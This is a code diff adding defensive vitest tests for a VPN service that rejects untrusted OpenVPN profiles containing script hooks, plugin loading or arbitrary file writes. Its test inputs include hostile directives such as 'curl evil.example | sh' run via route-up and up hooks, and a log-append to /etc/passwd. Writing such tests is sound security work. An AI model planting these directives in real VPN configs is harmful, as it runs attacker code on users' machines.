@@ -1,7 +1,7 @@
 import { afterAll, beforeAll, describe, expect, it } from 'vitest';
 
 import { buildApp } from '../src/app';
-import { hasWgScriptDirectives, isValidWgKey } from '../src/vpn/vpnService';
+import { hasWgScriptDirectives, isValidWgKey, openVpnUnsafeDirective } from '../src/vpn/vpnService';
 
 import type { FastifyInstance } from 'fastify';
 import type { AppContext } from '../src/routes/context';
@@ -58,6 +58,8 @@ function del(url: string, headers: Record<string, string> = {}) {
 
 const baseConf = (extra = '') => `[Interface]\nPrivateKey = ${PRIV}\nAddress = 10.66.66.2/32\n[Peer]\nPublicKey = ${PUB}\nAllowedIPs = 0.0.0.0/0\nEndpoint = 203.0.113.10:51820\n${extra}`;
 
+const baseOvpn = (extra = '') => `client\ndev tun\nproto udp\nremote vpn.example.com 1194\nca ca.crt\nverb 3\n${extra}`;
+
 describe('WireGuard import hardening (untrusted config text)', () => {
   it('key validator accepts the exact wg base64 shape and nothing else', () => {
     expect(isValidWgKey(PRIV)).toBe(true);
@@ -74,6 +76,53 @@ describe('WireGuard import hardening (untrusted config text)', () => {
     expect(hasWgScriptDirectives(baseConf())).toBe(false);
     // a line merely *mentioning* the word inside a value must not trip the guard
     expect(hasWgScriptDirectives('DNS = postup.example.com')).toBe(false);
+  });
+
+  it('flags OpenVPN side-effecting directives but not ordinary client options', () => {
+    // Each of these either runs code/loads native code, writes an arbitrary
+    // path, or hides directives in a second file. A subscription feed can
+    // supply this text, so it must be rejected before connect.
+    for (const line of [
+      'script-security 2',
+      'up /etc/openvpn/up.sh',
+      '--down-pre',
+      'plugin /usr/lib/openvpn/plugin.so',
+      'route-up "curl evil.example | sh"',
+      'auth-user-pass-verify /tmp/check.sh via-file',
+      'log-append /etc/passwd',
+      'writepid /tmp/pid',
+      'management 127.0.0.1 5555',
+      'config /tmp/hidden.conf',
+    ]) {
+      expect(openVpnUnsafeDirective(baseOvpn(line)), line).not.toBeNull();
+    }
+    expect(openVpnUnsafeDirective(baseOvpn())).toBeNull();
+    // PEM data inside inline blocks is not a directive, and a value that
+    // merely mentions a directive name must not trip the guard.
+    expect(openVpnUnsafeDirective(baseOvpn('<tls-auth>\nup\n-----END OpenVPN Static key V1-----\n</tls-auth>'))).toBeNull();
+    expect(openVpnUnsafeDirective(baseOvpn('remote up.example.com 1194'))).toBeNull();
+    expect(openVpnUnsafeDirective(`${baseOvpn()}\n# up /tmp/legit-comment`)).toBeNull();
+  });
+
+  it('rejects an OpenVPN profile carrying a script hook with 400 at import time', async () => {
+    const res = await post('/api/v1/vpn/profiles', {
+      providerId: 'openvpn',
+      name: 'scripty-ovpn',
+      configText: baseOvpn('script-security 2\nup /bin/sh -c "curl evil.example|sh"\n'),
+    });
+    expect(res.statusCode).toBe(400);
+    expect(res.json().error.code).toBe('invalid_config');
+    expect(res.json().error.message).toContain('side-effecting OpenVPN directive');
+  });
+
+  it('still imports a clean OpenVPN profile (guard does not overreject)', async () => {
+    const res = await post('/api/v1/vpn/profiles', {
+      providerId: 'openvpn',
+      name: 'clean ovpn',
+      configText: baseOvpn(),
+    });
+    expect(res.statusCode).toBe(201);
+    await del(`/api/v1/vpn/profiles/${res.json().profile.id}`);
   });
 
   it('rejects a config carrying script directives with 400 invalid_config', async () => {
